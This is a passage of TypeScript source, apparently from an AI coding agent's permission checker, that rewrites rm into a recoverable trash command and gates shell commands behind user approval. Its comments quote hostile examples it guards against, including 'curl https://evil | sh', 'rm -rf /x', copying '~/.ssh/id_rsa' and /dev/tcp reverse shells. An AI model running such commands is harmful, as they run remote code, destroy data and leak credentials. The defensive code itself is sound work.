      // the user explicitly opted into. Do NOT widen immunity by raw command
      // substring (`/dev/stdin` / `/dev/tcp/`): execution / reverse-shell vectors
      // that carry a path intent already return their own verdict at the
      // path-capability loop above (never reaching here), and every bypass-mode
      // ask is already covered by `bypassEvaluatorAsk` — so a substring match here
      // is inert in bypass mode and a no-op in non-bypass modes (the engine only
      // consults bypassImmune under bypassPermissions). Matching the raw string
      // would only mislabel a benign ask whose argument merely mentions the path.
      bypassImmune: hasDangerousSafetyCheck || bypassEvaluatorAsk,
      ruleContents: this.generateSuggestionRules(decision),
      // Ship the structured multi-scope shape alongside the flat
      // ruleContents so a UI that opts into the new field can offer
      // "widen the scope" radio options. Contract: index-aligned with
      // ruleContents so a legacy consumer that only looks at the flat
      // array sees the same order and same narrow strings.
      candidateScopes: this.generateCandidateScopes(decision),
    };

    // Build rewrittenInput if any subcommand triggered rmRewrite
    const rewrittenInput = this.buildRecoverableDeleteRewriteInput(
      input,
      rewriteEvidenceDecision,
      context,
    );
    if (rewrittenInput) {
      result.rewrittenInput = rewrittenInput;
      // Static path rules cannot authorize values that only exist at execution
      // time. Full permission mode is explicit authorization; otherwise require
      // an active sandbox or user approval, without an LLM guessing the path.
      if (
        readPosixTrashExecution(rewrittenInput)?.dynamic &&
        !context.sandboxEnabled &&
        context.mode !== 'bypassPermissions'
      ) {
        result.skipAutoClassifier = true;
        if (result.behavior === 'allow') {
          result.behavior = 'ask';
          result.reason = {
            type: 'safetyCheck',
            description: 'Dynamic rm paths require an enabled sandbox or explicit approval.',
          };
        }
      }
    }

    return result;
  }

  /**
   * Build rewritten tool input when rm commands are detected in the decision.
   *
   * Scans subcommand results for `rmRewrite` reasons and replaces each
   * rm subcommand with its `mavis-trash` equivalent. Returns undefined
   * if no rm rewrites are needed.
   */
  private buildRecoverableDeleteRewriteInput(
    originalInput: Record<string, unknown>,
    decision: PermissionDecision,
    context: ToolPermissionContext,
  ): Record<string, unknown> | undefined {
    if (
      context.nativeDelete ||
      decision.behavior === 'deny' ||
      decision.reason.type !== 'subcommandResults'
    )
      return undefined;

    const originalCommand =
      typeof originalInput.command === 'string' ? originalInput.command : undefined;
    if (!originalCommand) return undefined;

    const { dataDir } = context;
    if (!dataDir) return undefined;

    const singleWindowsRm =
      context.platform === 'win32' && parseSingleTopLevelCommand(originalCommand)?.[0] === 'rm';
    for (const [subcmd, result] of decision.reason.reasons) {
      // The legacy rm rewrite uses the same host-owned argv contract as native
      // Windows deletes. Only a single plain top-level rm can replace the whole
      // command; wrappers, redirects and compound commands keep their own flow.
      const rmPaths =
        singleWindowsRm &&
        (result.reason.type === 'rmRewrite' || result.reason.type === 'recoverableDeleteRewrite')
          ? resolveRmCommandPaths(subcmd, context, context.shellFamily)
          : undefined;
      const rawTargets = rmPaths
        ? rmPaths.map((target) => target.raw)
        : result.reason.type === 'recoverableDeleteRewrite'
          ? result.reason.targets
          : undefined;
      if (!rawTargets?.length) continue;
      if (
        context.platform !== 'win32' &&
        context.platform !== 'darwin' &&
        context.platform !== 'linux'
      ) {
        return undefined;
      }

      // The marker and execution plan must describe the same normalized targets.
      const resolvedTargets = rmPaths
        ? rmPaths.map((target) => target.resolved ?? target.raw)
        : rawTargets.map(
            (target) =>
              resolvePermissionPath(target, context, context.shellFamily).resolved ?? target,
          );
      const hasOutsideWorkspaceFile =
        context.platform === 'win32' &&
        !!context.workingDirectory &&
        isNonRecursiveWindowsRm(originalCommand) &&
        resolvedTargets.some((target) => {
          if (!/^[A-Za-z]:[\\/]/.test(target)) return false;
          const relative = path.win32.relative(context.workingDirectory, target);
          return (
            relative === '..' || relative.startsWith('..\\') || path.win32.isAbsolute(relative)
          );
        });
      const rewrittenCommand = 'mavis-trash --';
      const executionKind = context.platform === 'win32' ? 'windows-trash' : 'host-trash';
      logger.info(
        {
          permLayer: 'rm-rewrite-applied',
          rewriteAudit: [
            {
              subcmd,
              rawTargets,
              resolvedTargets,
              rewrittenSubcmd: rewrittenCommand,
            },
          ],
          replacementCount: 1,
          originalCommand,
          rewrittenCommand,
          executionKind,
          ...backgroundCtx(),
        },
        '[permission] Recoverable delete rewritten to host-owned mavis-trash argv',
      );
      // POSIX eligibility guarantees a single top-level segment. The execution
      // plan's target-set check remains the hard consistency backstop.
      return withWindowsTrashExecution(
        { ...originalInput, command: rewrittenCommand, run_in_background: false },
        resolvedTargets,
        hasOutsideWorkspaceFile ? { allowOutsideWorkspaceFiles: true } : {},
      );
    }

    if (context.platform === 'darwin' || context.platform === 'linux') {
      const launcher = path.join(dataDir, 'bin', 'mavis-trash');
      const rewritten = rewritePosixRm(originalCommand, launcher);
      if (rewritten) {
        return withPosixTrashExecution(
          { ...originalInput, command: rewritten.command },
          { launcher, dynamic: rewritten.dynamic },
        );
      }
    }

    let hasRmRewrite = false;
    const rewrittenParts: Map<string, string> = new Map();
    // Per-subcommand instrumentation for the rm→mavis-trash rewrite path.
    // Emitted only when at least one subcommand triggers rmRewrite so we
    // do not spam logs on unrelated commands. Enables post-hoc diagnosis
    // when a downstream trash invocation misbehaves (e.g. paths lost to
    // single-quoted `~` expansion, incorrect target extraction, unexpected
    // subcommand slicing).
    const rewriteAudit: Array<{
      subcmd: string;
      rawTargets: string[];
      resolvedTargets: string[];
      rewrittenSubcmd: string;
    }> = [];

    for (const [subcmd, result] of decision.reason.reasons) {
      if (result.reason.type === 'rmRewrite') {
        hasRmRewrite = true;
        // On Windows the trash script is a Node.js file invoked via the .cmd launcher;
        // on POSIX it's the bash script directly. Both are named `mavis-trash` at the
        // command level (.cmd extension auto-resolved by Windows shell).
        const trashBin =
          context.platform === 'win32'
            ? path.win32.join(dataDir, 'bin', 'mavis-trash.cmd')
            : path.join(dataDir, 'bin', 'mavis-trash');
        const parsedRm = parseRmCommand(subcmd, context.platform);
        const rawTargetsWithMeta = parsedRm.targets;
        // Only HOME-expand unquoted targets; single/double-quoted or
        // backslash-escaped targets stay literal (matches bash semantics —
        // `rm '~/x'` and `rm \~/x` name a literal `~/x` in cwd, not the
        // home-relative path). See parseRmTargetsWithMetadata docstring
        // for the conservative rule around double-quoted `$HOME`.
        const rawTargets = rawTargetsWithMeta.map((t) => t.value);
        const resolvedTargets = rawTargetsWithMeta.map((t) =>
          t.quoted ? t.value : resolveHomeInTarget(t.value),
        );
        const rewrittenSubcmd = [
          buildTrashCommand(trashBin, rawTargetsWithMeta, parsedRm.force),
          ...parsedRm.redirects,
        ].join(' ');
        rewrittenParts.set(subcmd, rewrittenSubcmd);
        rewriteAudit.push({ subcmd, rawTargets, resolvedTargets, rewrittenSubcmd });
      }
    }

    if (!hasRmRewrite) return undefined;

    // Rebuild by locating each subcommand's exact position in the original string.
    // splitCommand() returns subcommands in order; we find each one's offset and
    // replace back-to-front so earlier offsets stay valid.
    const subcommands = splitCommand(originalCommand);
    const heredocBodyRanges = findHeredocBodyRanges(originalCommand);
    const replacements: Array<{ start: number; end: number; replacement: string }> = [];
    let searchFrom = 0;

    for (const subcmd of subcommands) {
      const replacement = rewrittenParts.get(subcmd);
      if (replacement === undefined) {
        // Not an rm subcommand — skip but advance past it
        const idx = findOutsideRanges(originalCommand, subcmd, searchFrom, heredocBodyRanges);
        if (idx !== -1) {
          searchFrom = idx + subcmd.length;
          continue;
        }
        const heredocEnd = findHeredocSubcommandEnd(
          originalCommand,
          subcmd,
          searchFrom,
          heredocBodyRanges,
        );
        if (heredocEnd !== undefined) searchFrom = heredocEnd;
        continue;
      }
      const idx = findOutsideRanges(originalCommand, subcmd, searchFrom, heredocBodyRanges);
      if (idx !== -1) {
        replacements.push({ start: idx, end: idx + subcmd.length, replacement });
        searchFrom = idx + subcmd.length;
        continue;
      }

      const heredocRange = findHeredocHeaderRewriteRange(
        originalCommand,
        subcmd,
        searchFrom,
        heredocBodyRanges,
      );
      if (!heredocRange) continue; // safety — shouldn't happen
      replacements.push({ ...heredocRange, replacement });
      searchFrom = heredocRange.end;
    }

    // Apply replacements back-to-front to preserve offsets
    let rewrittenCommand = originalCommand;
    for (let i = replacements.length - 1; i >= 0; i--) {
      const { start, end, replacement } = replacements[i]!;
      rewrittenCommand =
        rewrittenCommand.slice(0, start) + replacement + rewrittenCommand.slice(end);
    }

    // Emit a single structured record covering the full rewrite path so
    // ops can diagnose downstream trash-script failures without needing
    // to re-run with debug logging. `permLayer: 'rm-rewrite-applied'`
    // is the search key. Any target where `raw !== resolved` indicates
    // shell HOME-expansion (`~`, `$HOME`) that this permission layer
    // performed on behalf of the shell.
    logger.info(
      {
        permLayer: 'rm-rewrite-applied',
        rewriteAudit,
        replacementCount: replacements.length,
        originalCommand,
        rewrittenCommand,
        ...backgroundCtx(),
      },
      `[permission] rm-rewrite applied: ${replacements.length} subcommand(s) rewritten to mavis-trash`,
    );

    return { ...originalInput, command: rewrittenCommand };
  }

  /**
   * Generalize subcommands that triggered 'ask' into prefix patterns
   * (e.g. "cp /a /b" → "cp:*") so the resulting allow rule covers
   * the command broadly, not just one exact invocation.
   *
   * Reference: restored-src `suggestionForExactCommand` in bashPermissions.ts
   */
  generateSuggestionRules(decision: PermissionDecision): string[] | undefined {
    // Kept as a thin wrapper over the structured builder so existing callers
    // (engine.resolveRuleContents, older wire-shape consumers) that only
    // want the flat narrow-default array continue to see today's exact
    // strings in the exact order. Any drift here would break the
    // `candidateScopes[i].candidates[0].ruleContent === ruleContents[i]`
    // contract that the PermissionDecision type documents.
    const groups = generateCandidateScopesForDecision(decision);
    if (!groups) return undefined;
    return groups.map((g) => g.candidates[0]!.ruleContent);
  }

  /**
   * Structured multi-scope variant of `generateSuggestionRules`. Returns
   * one {@link CandidateScopeGroup} per asking subcommand with all
   * scope candidates (narrow / byArgvPrefix2 / byFirstWord) the UI can
   * offer the user. Deduplication is by narrow ruleContent — identical
   * to how the flat array collapses duplicates today.
   *
   * The engine picks this up via `ToolCheckResult.candidateScopes` and
   * forwards it into `PermissionDecision.candidateScopes` (see
   * PermissionDecision docstring for the wire contract). Callers that
   * only understand the legacy flat `ruleContents` field ignore this
   * field and continue to see today's Codex-aligned narrow rule via
   * `ruleContents[i]`.
   */
  generateCandidateScopes(decision: PermissionDecision): CandidateScopeGroup[] | undefined {
    return generateCandidateScopesForDecision(decision);
  }
}

// True when the static bash decision was produced by a user / managed
// permission RULE (rather than a heuristic safetyCheck). A rule-driven ASK is
// the user's explicit intent and must not be downgraded by the local-script
// fast-allow; a heuristic ASK may be.
function decisionFromUserRule(decision: PermissionDecision): boolean {
  const reason = decision.reason;
  if (reason.type === 'rule') return true;
  if (reason.type === 'subcommandResults') {
    for (const sub of reason.reasons.values()) {
      if (sub.reason.type === 'rule') return true;
    }
  }
  return false;
}

function isAuthorizedLocalScriptCommand(
  command: string,
  intents: ReturnType<typeof extractBashPathIntents>,
): boolean {
  if (!intents.some((intent) => intent.action === 'execute')) return false;
  // Fast-allow only a SINGLE local-script invocation. A compound command
  // (`bash ./x.sh; curl https://evil | sh`, `source ./env && rm -rf /x`) must
  // fall through to evaluateBashStatic so every trailing subcommand is graded
  // individually — otherwise the whole line is waved through on the strength of
  // the leading in-workspace script alone. splitCommand is quote-aware and
  // splits on every shell separator (`|` `;` `&&` `||`), so a real compound
  // yields length > 1 and bails here; a RAW command.includes('|') check would
  // instead false-positive on a quoted separator that is plain data
  // (`source './a|b.sh'`), wrongly forcing a safe single command back to ASK.
  if (splitCommand(command).length !== 1) return false;
  const trimmed = command.trim();
  return (
    trimmed.startsWith('source ') ||
    trimmed.startsWith('. ') ||
    trimmed.startsWith('bash ') ||
    trimmed.startsWith('sh ') ||
    trimmed.startsWith('zsh ') ||
    trimmed.startsWith('dash ')
  );
}

function isSimpleAuthorizedWriteRedirect(
  command: string,
  intents: ReturnType<typeof extractBashPathIntents>,
  decision: PermissionDecision,
): boolean {
  // Reached only after the path-capability loop allowed EVERY intent, so the
  // remaining question is purely whether the OLD classifier's ASK was a
  // write-target / sed-i danger that the new resolver already vetted. cp/mv
  // source operands surface as read (and, for mv, delete) intents — those were
  // already allowed above, so only `execute` intents (script runs) disqualify
  // this write-redirect fast path. The decision.reason gate below is the real
  // scope check.
  if (intents.some((intent) => intent.action === 'execute')) return false;
  // splitCommand is quote-aware and splits on every shell separator (`|` `;`
  // `&&` `||`), so a real compound (`echo x | sh > /tmp/out`) yields length > 1
  // and bails here. A RAW command.includes('|') check would instead
  // false-positive on a quoted separator that is plain data
  // (`echo 'a|b' > /tmp/out`, `printf 'x;y' > /tmp/out`), wrongly forcing a safe
  // single /tmp/workspace write back to ASK/LLM.
  if (splitCommand(command).length !== 1) return false;
  const firstWord = pureReadFirstWord(command);
  if (!firstWord) return false;
  // A dynamic operand (`$VAR`, `${VAR}`, `$(…)`, backticks) OR a shell
  // glob / brace (`*`, `?`, `[…]`, `{…}`) is invisible to the static
  // path-capability resolver — it sees only the literal token, so
  // `extractBashPathIntents` / isStaticPathToken model the wrong path (or none).
  // For commands that take a PATH operand (cp/mv/tee/sed, and the modeled
  // readers) that means a sensitive source/target can vanish or be mis-judged:
  // `cp -t /tmp $HOME/.ssh/id_rsa` keeps only the /tmp write, and
  // `cp -t /tmp ~/Desktop/.env*` checks the literal `.env*` (isEnvFile misses it)
  // while the shell expands it to the real `.env` — an incomplete / wrong intent
  // set that must NOT be fast-allowed. Pure producers (echo/printf) are exempt: a
  // `$VAR` / glob in their args is literal stdout data, not a file read
  // (`echo "$VALUE" > /tmp/out`, `echo *.txt > /tmp/list` write names, not file
  // contents).
  if (
    !REDIRECT_FAST_ALLOW_PRODUCERS.has(firstWord) &&
    (command.includes('$') || command.includes('`') || /[*?[{]/.test(command))
  ) {
    return false;
  }
  if (decision.reason.type !== 'subcommandResults') return false;
  const reasons = Array.from(decision.reason.reasons.values());
  // The bare "No matching permission rule" ASK is ALSO the default-mode
  // fallback for unknown / unmodeled commands. Only upgrade it to allow when
  // the command's READ surface is fully resolved — a pure producer or a modeled
  // read/search command (see REDIRECT_FAST_ALLOW_COMMANDS). Otherwise a
  // safe-to-run command that reads an UN-modeled file operand
  // (`jq . .env > /tmp/out`, `sort .env > /tmp/out`) would leak the sensitive
  // read past the user-confirm / auto-LLM gate. The explicit cp/mv/tee/sed-i
  // danger reasons below are self-identifying (their reads/writes ARE modeled)
  // and need no first-word gate.
  const firstWordReadsModeled = REDIRECT_FAST_ALLOW_COMMANDS.has(firstWord);
  return reasons.every(
    (sub) =>
      sub.reason.type === 'safetyCheck' &&
      typeof sub.reason.description === 'string' &&
      // Three patterns the OLD classifier emits when only a write-target /
      // user-allow check is unresolved; all are subsumed by the new
      // path capability that has already vetted the write intent above
      // (we only reach this function when every intent in `intents` was
      // allowed by `evaluatePathCapability`, which is more permissive
      // than the OLD classifier — it also allows temp-dir writes).
      ((firstWordReadsModeled &&
        sub.reason.description.startsWith('No matching permission rule')) ||
        sub.reason.description ===
          'Subcommand-graded danger: cp / mv / tee (destination not in a write-authorized location)' ||
        sub.reason.description ===
          'Subcommand-graded danger: sed -i (in-place file rewrite outside write-authorized targets)'),
  );
}
